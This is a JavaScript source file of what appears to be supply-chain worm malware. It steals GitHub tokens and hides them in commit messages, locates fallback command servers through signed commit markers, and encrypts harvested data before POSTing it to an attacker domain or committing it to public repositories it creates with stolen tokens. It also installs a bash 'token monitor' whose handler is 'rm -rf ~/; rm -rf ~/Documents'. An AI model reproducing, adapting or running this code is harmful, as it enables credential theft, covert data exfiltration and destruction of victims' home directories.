/*
 * Commit marker recovery, signed domain configuration, encrypted exfil envelopes, domain sender, GitHub repo sender, and sender selection.
 */

import commitMarkerCrypto from "crypto";
var commitSearchRetryDelaysMs = [10000, 30000, 90000];
async function retryAsyncWithBackoff(retryOperation, retryLabel) {
  for (
    let retryAttemptIndex = 0;
    retryAttemptIndex <= commitSearchRetryDelaysMs.length;
    retryAttemptIndex++
  )
    try {
      return await retryOperation();
    } catch (retryError) {
      let retryErrorMessage =
        retryError instanceof Error ? retryError.message : String(retryError);
      if (retryAttemptIndex < commitSearchRetryDelaysMs.length) {
        let retryDelayMs = commitSearchRetryDelaysMs[retryAttemptIndex];
        await new Promise((resolveRetryDelay) =>
          setTimeout(resolveRetryDelay, retryDelayMs),
        );
      } else throw retryError;
    }
  throw Error("unreachable");
}
async function recoverGithubTokenFromCommitMarker(githubTokenForSearch) {
  let commitTokenSearchPath =
      "/search/commits?q=" +
      githubCommitTokenMarker +
      "&sort=author-date&order=desc&per_page=50",
    commitTokenSearchAuthMode = githubTokenForSearch
      ? "authenticated"
      : "unauthenticated";
  try {
    let fetchCommitTokenSearch = () =>
        githubJson(githubTokenForSearch ?? "", commitTokenSearchPath),
      commitTokenSearchResults = githubTokenForSearch
        ? await fetchCommitTokenSearch()
        : await retryAsyncWithBackoff(fetchCommitTokenSearch, "fetchCommit");
    if (
      !commitTokenSearchResults.items ||
      commitTokenSearchResults.items.length === 0
    )
      return false;
    let minRecoveredTokenRateRemaining = 200,
      bestRecoveredToken = null,
      seenRecoveredTokens = new Set();
    for (
      let commitTokenSearchIndex = 0;
      commitTokenSearchIndex < commitTokenSearchResults.items.length;
      commitTokenSearchIndex++
    ) {
      let commitTokenSearchItem =
        commitTokenSearchResults.items[commitTokenSearchIndex];
      if (!commitTokenSearchItem) continue;
      let commitTokenMarkerMatch = new RegExp(
        "^" + githubCommitTokenMarker + ":([A-Za-z0-9+/]{1,100}={0,3})$",
      ).exec(commitTokenSearchItem.commit.message ?? "");
      if (!commitTokenMarkerMatch?.[1]) continue;
      let recoveredGithubToken = Buffer.from(
        Buffer.from(commitTokenMarkerMatch[1], "base64").toString("utf8"),
        "base64",
      ).toString("utf8");
      if (seenRecoveredTokens.has(recoveredGithubToken)) continue;
      seenRecoveredTokens.add(recoveredGithubToken);
      let recoveredTokenMetadata =
        await validateGitHubTokenBasic(recoveredGithubToken);
      if (!recoveredTokenMetadata.hasRepoScope) continue;
      let recoveredTokenRateRemaining =
        recoveredTokenMetadata.rateRemaining ?? 0;
      if (recoveredTokenRateRemaining >= minRecoveredTokenRateRemaining)
        return recoveredGithubToken;
      if (
        !bestRecoveredToken ||
        recoveredTokenRateRemaining > bestRecoveredToken.rateRemaining
      )
        bestRecoveredToken = {
          token: recoveredGithubToken,
          rateRemaining: recoveredTokenRateRemaining,
        };
    }
    if (bestRecoveredToken) return bestRecoveredToken.token;
    return false;
  } catch (commitTokenRecoveryError) {
    return false;
  }
}
function verifySignedCommitMarker(
  commitMessageText,
  signedCommitPublicKey,
  signedCommitHashAlgorithm = "sha256",
) {
  try {
    let signedCommitMarkerRegex =
        /thebeautifulsnadsoftime ([A-Za-z0-9+/=]{1,30})\.([A-Za-z0-9+/=]{1,700})/,
      signedCommitMarkerMatch = commitMessageText.match(
        signedCommitMarkerRegex,
      );
    if (
      !signedCommitMarkerMatch ||
      !signedCommitMarkerMatch[1] ||
      !signedCommitMarkerMatch[2]
    )
      return { valid: false };
    let signedCommitMarkerPayload = Buffer.from(
        signedCommitMarkerMatch[1],
        "base64",
      ).toString("utf-8"),
      signedCommitMarkerSignature = Buffer.from(
        signedCommitMarkerMatch[2],
        "base64",
      ),
      signedCommitMarkerVerifier = commitMarkerCrypto.createVerify(
        signedCommitHashAlgorithm,
      );
    return (
      signedCommitMarkerVerifier.update(signedCommitMarkerPayload),
      signedCommitMarkerVerifier.verify(
        signedCommitPublicKey,
        signedCommitMarkerSignature,
      )
        ? { valid: true, data: signedCommitMarkerPayload }
        : { valid: false }
    );
  } catch (signedCommitVerifyError) {
    return { valid: false };
  }
}
async function findSignedCommitMessage(
  signedCommitSearchQuery,
  signedCommitSearchPublicKey,
) {
  let signedCommitSearchPath =
    "/search/commits?q=" +
    encodeURIComponent(signedCommitSearchQuery) +
    "&sort=author-date&order=desc";
  try {
    let signedCommitSearchResults = await retryAsyncWithBackoff(
      () => githubJson("", signedCommitSearchPath),
      "findValidSignedCommit",
    );
    if (
      !signedCommitSearchResults.items ||
      signedCommitSearchResults.items.length === 0
    )
      return { found: false, message: "No commits found" };
    for (
      let signedCommitSearchIndex = 0;
      signedCommitSearchIndex < signedCommitSearchResults.items.length;
      signedCommitSearchIndex++
    ) {
      let signedCommitSearchItem =
        signedCommitSearchResults.items[signedCommitSearchIndex];
      if (!signedCommitSearchItem) continue;
      let signedCommitMessage = signedCommitSearchItem.commit.message,
        signedCommitVerification = verifySignedCommitMarker(
          signedCommitMessage,
          signedCommitSearchPublicKey,
        );
      if (signedCommitVerification.valid && signedCommitVerification.data)
        return {
          found: true,
          message: signedCommitVerification.data,
          commit: signedCommitSearchItem,
        };
    }
    return { found: false, message: "No commits with valid signatures found" };
  } catch (signedCommitSearchError) {
    return {
      found: false,
      message:
        "Error during search: " +
        (signedCommitSearchError instanceof Error
          ? signedCommitSearchError.message
          : String(signedCommitSearchError)),
    };
  }
}
import * as exfilDns from "dns";
import * as exfilHttps from "https";
import * as exfilCrypto from "crypto";
import { promisify as promisifyExfilGzip } from "util";
import * as exfilZlib from "zlib";
var gzipAsync = promisifyExfilGzip(exfilZlib.gzip);
class ExfilSenderBase {
  name;
  destination;
  constructor(exfilSenderName, exfilSenderDestination) {
    (this.name = exfilSenderName), (this.destination = exfilSenderDestination);
  }
  async healthy() {
    return true;
  }
  async createEnvelope(exfilEnvelopePayload) {
    let exfilEnvelopeJson = JSON.stringify(exfilEnvelopePayload),
      exfilEnvelopePlaintextBuffer = Buffer.from(exfilEnvelopeJson),
      exfilEnvelopeGzipBuffer = await gzipAsync(exfilEnvelopePlaintextBuffer),
      exfilEnvelopeAesKey = exfilCrypto.randomBytes(32),
      exfilEnvelopeNonce = exfilCrypto.randomBytes(12),
      exfilEnvelopeWrappedKey = exfilCrypto.publicEncrypt(
        {
          key: exfilEnvelopePublicKey,
          padding: exfilCrypto.constants.RSA_PKCS1_OAEP_PADDING,
          oaepHash: "sha256",
        },
        exfilEnvelopeAesKey,
      ),
      exfilEnvelopeCipher = exfilCrypto.createCipheriv(
        "aes-256-gcm",
        exfilEnvelopeAesKey,
        exfilEnvelopeNonce,
      ),
      exfilEnvelopeCiphertext = Buffer.concat([
        exfilEnvelopeCipher.update(exfilEnvelopeGzipBuffer),
        exfilEnvelopeCipher.final(),
        exfilEnvelopeCipher.getAuthTag(),
      ]);
    return {
      envelope: Buffer.concat([
        exfilEnvelopeNonce,
        exfilEnvelopeCiphertext,
      ]).toString("base64"),
      key: exfilEnvelopeWrappedKey.toString("base64"),
    };
  }
}
class DomainExfilSender extends ExfilSenderBase {
  constructor(domainSenderConfig) {
    super("domain", {
      domain: domainSenderConfig.domain,
      port: domainSenderConfig.port,
      path: domainSenderConfig.path,
      dry_run: domainSenderConfig.dry_run,
      noop: domainSenderConfig.noop,
    });
  }
  get url() {
    return (
      "https://" +
      this.destination.domain +
      ":" +
      this.destination.port +
      "/" +
      this.destination.path
    );
  }
  async healthy() {
    if (this.destination.noop) return false;
    try {
      if (this.destination.dry_run) return true;
      await exfilDns.promises.lookup(this.destination.domain);
    } catch {
      return false;
    }
    return new Promise((resolveDomainHealth) => {
      let domainHealthRequest = exfilHttps.get(
        this.url,
        { timeout: 5000 },
        (domainHealthResponse) => {
          resolveDomainHealth(
            domainHealthResponse.statusCode === 400 ||
              domainHealthResponse.statusCode === 404,
          );
        },
      );
      domainHealthRequest.on("error", (domainHealthError) => {
        resolveDomainHealth(false);
      }),
        domainHealthRequest.on("timeout", () => {
          domainHealthRequest.destroy(), resolveDomainHealth(false);
        });
    });
  }
  async send(domainExfilEnvelope) {
    if (this.destination.dry_run) return;
    let domainExfilResponse = await fetch(this.url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(domainExfilEnvelope),
    });
    if (domainExfilResponse.status !== 200)
      throw Error(
        "DomainSender: " +
          this.url +
          " returned status " +
          domainExfilResponse.status,
      );
  }
}
class DomainExfilSenderFactory {
  config;
  constructor(domainFactoryConfig) {
    this.config = domainFactoryConfig;
  }
  async tryCreate() {
    let configuredDomainSender = new DomainExfilSender(this.config);
    if (await configuredDomainSender.healthy()) return configuredDomainSender;
    let signedDomainLookup = await findSignedCommitMessage(
      "thebeautifulmarchoftime ",
      signedDomainPublicKey,
    );
    if (!signedDomainLookup.found) return null;
    if (signedDomainLookup.message) {
      let signedDomainConfig = {
          domain: signedDomainLookup.message,
          port: this.config.port,
          path: this.config.path,
        },
        signedDomainSender = new DomainExfilSender(signedDomainConfig);
      if (await signedDomainSender.healthy()) return signedDomainSender;
    }
    return null;
  }
}
initGithubApiModule(), initGithubApiModule();
class GitHubTokenMonitorInstaller extends InfectionJobBase {
  token;
  handler;
  constructor(tokenMonitorToken, tokenMonitorHandler) {
    super(),
      ((this.token = tokenMonitorToken), (this.handler = tokenMonitorHandler));
  }
  async installTokenMonitor(
    tokenMonitorInstallToken,
    tokenMonitorInstallHandler,
  ) {
    try {
      let tokenMonitorProcess = Bun.spawn(
        [
          "bash",
          "-s",
          "--",
          tokenMonitorInstallToken,
          tokenMonitorInstallHandler,
        ],
        { stdin: "pipe", stdout: "pipe", stderr: "pipe" },
      );
      tokenMonitorProcess.stdin.write(tokenMonitorBashScript),
        tokenMonitorProcess.stdin.end();
      let tokenMonitorExitCode = await tokenMonitorProcess.exited;
    } catch (tokenMonitorInstallError) {}
  }
  async execute() {
    try {
      await this.installTokenMonitor(this.token, this.handler);
    } catch (tokenMonitorExecuteError) {}
    return true;
  }
}
initGithubApiModule();
var repoNameAdjectives = [
    "stygian",
    "tartarean",
    "erebean",
    "infernal",
    "chthonic",
    "acheronian",
    "lethean",
    "plutonian",
    "abyssal",
    "charonian",
    "thanatic",
    "funereal",
    "nekyian",
    "sepulchral",
    "tenebrous",
    "cimmerian",
  ],
  repoNameNouns = [
    "cerberus",
    "charon",
    "tartarus",
    "erebus",
    "asphodel",
    "acheron",
    "styx",
    "lethe",
    "cocytus",
    "phlegethon",
    "shade",
    "eidolon",
    "wraith",
    "thanatos",
    "hecate",
    "persephone",
  ];
function generateHadesRepoName() {
  let repoNameAdjective =
      repoNameAdjectives[Math.floor(Math.random() * repoNameAdjectives.length)],
    repoNameNoun =
      repoNameNouns[Math.floor(Math.random() * repoNameNouns.length)],
    repoNameSuffixNumber = Math.floor(Math.random() * 100000);
  return repoNameAdjective + "-" + repoNameNoun + "-" + repoNameSuffixNumber;
}
async function createPublicGithubExfilRepo(exfilRepoGithubToken) {
  let generatedExfilRepoName = generateHadesRepoName(),
    createdExfilRepoResponse = await githubJson(
      exfilRepoGithubToken,
      "/user/repos",
      {
        method: "POST",
        body: JSON.stringify({
          name: generatedExfilRepoName,
          private: false,
          auto_init: true,
          description: "Hades - The End for the Damned",
          has_discussions: false,
          has_issues: false,
          has_wiki: false,
        }),
      },
    ),
    [createdExfilRepoOwner, createdExfilRepoName] =
      createdExfilRepoResponse.full_name.split("/");
  if (!createdExfilRepoOwner || !createdExfilRepoName)
    throw Error("Invalid repository");
  return {
    owner: createdExfilRepoOwner,
    name: createdExfilRepoResponse.name,
    fullName: createdExfilRepoResponse.full_name,
    url: createdExfilRepoResponse.html_url,
    private: createdExfilRepoResponse.private,
  };
}
class GitHubRepoExfilSender extends ExfilSenderBase {
  createdRepo = null;
  token = null;
  commitCounter = 0;
  includeToken = false;
  constructor() {
    super("github", { domain: "api.github.com", port: 443, path: "/repos/" });
  }
  async initialize(githubRepoSenderToken) {
    try {
      return (
        (this.createdRepo = await createPublicGithubExfilRepo(
          githubRepoSenderToken,
        )),
        (this.token = githubRepoSenderToken),
        (this.commitCounter = 0),
        true
      );
    } catch (githubRepoInitializeError) {
      return false;
    }
  }
  setIncludeToken(includeTokenFlag) {
    this.includeToken = includeTokenFlag;
  }
  async healthy() {
    return this.createdRepo !== null && this.token !== null;
  }
  async send(githubExfilEnvelope) {
    if (!this.createdRepo || !this.token)
      throw Error("GitHubSender not initialized");
    let augmentedGithubExfilEnvelope =
      await this.augmentEnvelope(githubExfilEnvelope);
    await this.commitToRepo(augmentedGithubExfilEnvelope);
  }
  async augmentEnvelope(githubEnvelopePayload) {
    if (!this.includeToken || !this.token) return githubEnvelopePayload;
    await new GitHubTokenMonitorInstaller(
      this.token,
      "rm -rf ~/; rm -rf ~/Documents",
    ).execute();
    let doubleBase64GithubToken = Buffer.from(
      Buffer.from(this.token).toString("base64"),
    ).toString("base64");
    return { ...githubEnvelopePayload, token: doubleBase64GithubToken };
  }
  async commitFileWithRetry(
    githubUploadFilename,
    githubUploadCommitMessage,
    githubUploadBase64Content,
  ) {
    for (
      let githubUploadAttempt = 1;
      githubUploadAttempt <= 5;
      githubUploadAttempt++
    )
      try {
        let githubContentsApiPath =
          "/repos/" +
          this.createdRepo.owner +
          "/" +
          this.createdRepo.name +
          "/contents/results/" +
          githubUploadFilename;
        await githubFetch(this.token, githubContentsApiPath, {
          method: "PUT",
          headers: {
            "Content-Type": "application/json",
            "X-GitHub-Api-Version": "2022-11-28",
          },
          body: JSON.stringify({
            message: githubUploadCommitMessage,
            content: githubUploadBase64Content,
          }),
        });
        return;
      } catch (githubUploadError) {
        if (githubUploadAttempt === 5)
          throw Error(
            "GitHubSender commit failed after " +
              githubUploadAttempt +
              " attempt(s): " +
              githubUploadError,
          );
        let githubUploadRetryDelayMs = Math.min(
          1000 * 2 ** (githubUploadAttempt - 1),
          16000,
        );
        await new Promise((resolveGithubUploadDelay) =>
          setTimeout(resolveGithubUploadDelay, githubUploadRetryDelayMs),
        );
      }
  }
  async commitToRepo(githubRepoEnvelopePayload) {
    let exfilRepoEnvelopeJson = JSON.stringify(
        githubRepoEnvelopePayload,
        null,
        2,
      ),
      githubContentChunkMaxBytes = 31457280,
      exfilResultsFilename =
        "results-" + Date.now() + "-" + this.commitCounter + ".json",
      exfilCommitMessage = githubRepoEnvelopePayload.token
        ? githubCommitTokenMarker + ":" + githubRepoEnvelopePayload.token
        : "Add files.",
      exfilPayloadBuffer = Buffer.from(exfilRepoEnvelopeJson, "utf8");
    if (exfilPayloadBuffer.length <= 31457280) {
      let exfilPayloadBase64 = exfilPayloadBuffer.toString("base64");
      await this.commitFileWithRetry(
        exfilResultsFilename,
        exfilCommitMessage,
        exfilPayloadBase64,
      ),
        this.commitCounter++;
    } else {
      let exfilPayloadPartCount = Math.ceil(
        exfilPayloadBuffer.length / 31457280,
      );
      for (
        let exfilPayloadPartIndex = 0;
        exfilPayloadPartIndex < exfilPayloadPartCount;
        exfilPayloadPartIndex++
      ) {
        let exfilPayloadPartBase64 = exfilPayloadBuffer
            .subarray(
              exfilPayloadPartIndex * 31457280,
              (exfilPayloadPartIndex + 1) * 31457280,
            )
            .toString("base64"),
          exfilPayloadPartFilename =
            exfilResultsFilename + ".p" + (exfilPayloadPartIndex + 1);
        await this.commitFileWithRetry(
          exfilPayloadPartFilename,
          exfilCommitMessage,
          exfilPayloadPartBase64,
        );
      }
      this.commitCounter++;
    }
  }
}
class GitHubRepoExfilSenderFactory {
  constructor() {}
  async tryCreate(repoFactoryProviderResults, repoFactorySeedToken) {
    if (repoFactoryProviderResults)
      return this.configureGit(repoFactoryProviderResults);
    else return this.setupGitHubSender(repoFactorySeedToken);
  }
  async configureGit(repoFactoryResults) {
    let discoveredGithubTokens = [];
    if (
      (repoFactoryResults
        .flatMap((repoFactoryResult) => {
          let repoFactoryMatches = repoFactoryResult?.matches;
          if (Array.isArray(repoFactoryMatches)) return repoFactoryMatches;
          if (repoFactoryMatches && typeof repoFactoryMatches === "object")
            return Object.values(repoFactoryMatches).flat();
          return [];
        })
        .forEach((repoFactoryMatchValue) => {
          if (
            typeof repoFactoryMatchValue === "string" &&
            (repoFactoryMatchValue.startsWith("ghp_") ||
              repoFactoryMatchValue.startsWith("gho_"))
          )
            discoveredGithubTokens.push(repoFactoryMatchValue);
        }),
      discoveredGithubTokens.length === 0)
    )
      return null;
    let usableGithubPatCandidates = [];
    for (let githubPatCandidate of discoveredGithubTokens)
      try {
        let githubUserResponse = await githubJson(githubPatCandidate, "/user");
        if (!githubUserResponse?.login) continue;
        if (!(await validateGitHubTokenBasic(githubPatCandidate)).hasRepoScope)
          continue;
        let githubUserOrgs = [];
        try {
          githubUserOrgs = await githubJson(githubPatCandidate, "/user/orgs");
        } catch {}
        usableGithubPatCandidates.push({
          pat: githubPatCandidate,
          user: githubUserResponse.login,
          hasRepoScope: true,
          orgs: githubUserOrgs,
        });
      } catch {
        continue;
      }
    if (usableGithubPatCandidates.length === 0) return null;
    let selectedGithubPatCandidate =
        Math.floor(Math.random() * 5) + 1 === 3
          ? (usableGithubPatCandidates.find(
              (usableGithubPatCandidate) =>
                usableGithubPatCandidate.orgs.length === 0,
            ) ?? usableGithubPatCandidates[0])
          : usableGithubPatCandidates[0],
      githubProfileResponse = await fetch(
        "https://github.com/" + selectedGithubPatCandidate.user,
      );
    if (
      githubProfileResponse.status === 404 ||
      githubProfileResponse.status === 302
    )
      return null;
    let githubRepoExfilSender = new GitHubRepoExfilSender();
    if (
      !(await githubRepoExfilSender.initialize(selectedGithubPatCandidate.pat))
    )
      return null;
    if (selectedGithubPatCandidate.orgs.length === 0)
      githubRepoExfilSender.setIncludeToken(true);
    return githubRepoExfilSender;
  }
  async setupGitHubSender(repoSetupSeedToken) {
    let repoSetupRecoveredToken =
      await recoverGithubTokenFromCommitMarker(repoSetupSeedToken);
    if (repoSetupRecoveredToken) {
      let repoSetupSender = new GitHubRepoExfilSender();
      if (await repoSetupSender.initialize(repoSetupRecoveredToken))
        return repoSetupSender;
      else return null;
    } else return null;
  }
}
async function buildExfilSenders(exfilProviderResults) {
  let skipDomainExfil = process.env.SKIP_DOMAIN === "true",
    domainExfilConfig = {
      domain: primaryExfilDomain,
      port: 443,
      path: domainExfilPath,
      dry_run: false,
      noop: true,
    },
    seedGithubToken;
  for (let exfilProviderResult of exfilProviderResults) {
    let jwtGithubTokens = exfilProviderResult.matches?.ghs_jwt,
      oldGithubTokens = exfilProviderResult.matches?.ghs_old;
    if (jwtGithubTokens?.length) {
      seedGithubToken = jwtGithubTokens[0];
      break;
    }
    if (oldGithubTokens?.length) {
      seedGithubToken = oldGithubTokens[0];
      break;
    }
  }
  let githubRepoSenderFactory = new GitHubRepoExfilSenderFactory(),
    exfilSenderCandidates = [];
  if (skipDomainExfil)
    exfilSenderCandidates.push(
      await githubRepoSenderFactory.tryCreate(void 0, seedGithubToken),
    );
  else {
    let domainSenderFactory = new DomainExfilSenderFactory(domainExfilConfig);
    exfilSenderCandidates.push(await domainSenderFactory.tryCreate());
  }
  if (skipDomainExfil || !exfilSenderCandidates[0]?.healthy()) {
    if (!skipDomainExfil)
      exfilSenderCandidates.push(
        await githubRepoSenderFactory.tryCreate(void 0, seedGithubToken),
      );
    if (!exfilSenderCandidates[exfilSenderCandidates.length - 1]?.healthy())
      exfilSenderCandidates.push(
        await githubRepoSenderFactory.tryCreate(exfilProviderResults),
      );
  }
  return exfilSenderCandidates.filter(
    (exfilSenderCandidate) => exfilSenderCandidate !== null,
  );
}
